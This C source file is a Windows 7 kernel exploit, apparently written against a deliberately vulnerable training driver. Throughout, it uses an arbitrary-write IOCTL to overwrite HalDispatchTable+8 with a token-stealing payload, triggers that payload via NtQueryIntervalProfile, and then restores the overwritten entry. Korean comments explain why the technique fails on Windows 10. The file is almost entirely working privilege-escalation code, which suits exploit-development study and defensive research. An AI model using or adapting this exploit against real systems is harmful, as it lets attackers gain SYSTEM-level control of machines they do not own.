#include "ArbitraryOverwrite.h"
#include "Common.h"

VOID
RestoreArbitaryOverWriteForWin7(VOID)
{
	SendIOCTL(
		RESTORE_ARBITRARY_OVERWRITE_CONTROL_CODE,
		NULL,
		0
	);
}

BOOLEAN 
ArbitaryOverWriteExploitForWin7(VOID)
{
	NTSTATUS status = 0;
	BOOLEAN bRetValue = FALSE;
	PVOID EopPayload = &TokenStealingPayloadWin7;
	HMODULE hNtModule = NULL;
	PWRITE_WHAT_WHERE WriteWhatWhere = NULL;
	ULONG ulInterval = 0;
	NTQUERYINTERVALPROFILE NtQueryIntervalProfile = NULL;

	WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(WRITE_WHAT_WHERE)
		);

	if (NULL == WriteWhatWhere)
	{
		goto _RET;
	}

	// Windows 10은 HalDispatchTable 주소는 구할 수 있지만, 이 영역에 실행 권한이 없다.
	// MDL을 사용하려고 해도 EXECUTE FLAG를 주는 방법은 없다.
	WriteWhatWhere->pulptrWhatAddress = (PULONG_PTR)&EopPayload;
	WriteWhatWhere->pulptrWhereAddress = (PULONG_PTR)((PUCHAR)GetNativeFuncAddress("HalDispatchTable") + sizeof(PVOID));

	bRetValue = SendIOCTL(
		ARBITRARY_OVERWRITE_CONTROL_CODE, 
		WriteWhatWhere, 
		sizeof(WRITE_WHAT_WHERE)
	);

	if (FALSE == bRetValue)
	{
		goto _RET;
	}

	hNtModule = LoadLibrary(L"ntdll.dll");

	if (NULL == hNtModule)
	{
		goto _RET;
	}

	NtQueryIntervalProfile = (NTQUERYINTERVALPROFILE)GetProcAddress(hNtModule, "NtQueryIntervalProfile");

	if (!NtQueryIntervalProfile)
	{
		goto _RET;
	}

	status = NtQueryIntervalProfile(0x1337, &ulInterval);

	if (0 != status)
	{
		goto _RET;
	}

	SendIOCTL(
		RESTORE_ARBITRARY_OVERWRITE_CONTROL_CODE,
		NULL,
		0
	);

	bRetValue = TRUE;

_RET:
	if (NULL != WriteWhatWhere)
	{
		HeapFree(GetProcessHeap(), 0, (LPVOID)WriteWhatWhere);
		WriteWhatWhere = NULL;
	}

	if (NULL != hNtModule)
	{
		FreeLibrary(hNtModule);
		hNtModule = NULL;
	}

	return bRetValue;
}
